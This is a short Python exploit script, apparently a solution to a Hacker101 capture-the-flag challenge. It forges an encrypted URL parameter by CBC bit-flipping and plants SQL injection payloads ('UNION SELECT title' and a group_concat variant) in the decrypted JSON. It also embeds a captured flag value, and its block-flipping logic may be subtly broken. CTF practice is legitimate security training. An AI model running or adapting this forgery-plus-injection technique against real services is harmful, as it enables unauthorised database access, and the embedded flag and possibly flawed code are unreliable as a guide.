#!/usr/bin/env python3
"""
CBC Bit-Flip + SQLi helper
Toggle PAYLOAD_CHOICE between 1 and 2, then run.
"""

import base64

TARGET = "https://6a5f15cb6c90c2b33eabedd6592f6c64.ctf.hacker101.com/"
ORIGINAL_CT = "93lLZZiWAT8AB39I1HPwKpnhjnQ5ZPHvfxIUT!AwixIMApx-AGeO5Ttq66HgWgXcOfLd4h1IrLQzGRv1!Nj5z6bJsrRXySwUpj!0BcBfjIM!4HH3XxMwsE5TfdGWbwqM8fa!QSU52SauyLElsq89sZiXwj-6DiKQijLUDLNNlrqWlwX-vTEpfN0Oo0du1dFYYK3DqCCUSOaiN1q-nahZlg~~"

# 1 = short UNION,  2 = group_concat titles
PAYLOAD_CHOICE = 1

def b64d(s):
    s = s.replace("-", "+").replace("!", "/").replace("~", "=")
    pad = len(s) % 4
    if pad:
        s += "=" * (4 - pad)
    return base64.b64decode(s)

def b64e(b):
    return base64.b64encode(b).decode().replace("+", "-").replace("/", "!").replace("=", "~")

old_pt = b'{"flag": "^FLAG^575c19bb7a2caae5b046969a30b774c6441115b5cff08bf3c9ae5f38b5dba679$FLAG$", "id": "3", "key": "q4bdYmAVu6VQJMUr4whwtQ~~"}'
old_pt_padded = old_pt + b"\n" * 10

ct = bytearray(b64d(ORIGINAL_CT))
assert len(ct) == len(old_pt_padded) + 16

if PAYLOAD_CHOICE == 1:
    payload = b'{"flag":"A","id":"1 UNION SELECT title,1--","key":"A"}'
else:
    payload = b'{"flag":"A","id":"1 UNION SELECT group_concat(title),1--","key":"A"}'

if len(payload) > len(old_pt_padded):
    raise SystemExit(f"payload too long: {len(payload)} > {len(old_pt_padded)}")
new_pt = payload + b"\n" * (len(old_pt_padded) - len(payload))

diff = bytes(a ^ b for a, b in zip(old_pt_padded, new_pt))

for i in range(0, len(diff), 16):
    prev_start = (i // 16) * 16
    for j in range(16):
        if i + j < len(diff):
            ct[prev_start + j] ^= diff[i + j]

forged = b64e(bytes(ct))
print(f"[*] Payload choice: {PAYLOAD_CHOICE}")
print("[*] Forged post value:")
print(forged)
print()
print("[*] Test URL:")
print(f"{TARGET}?post={forged}")
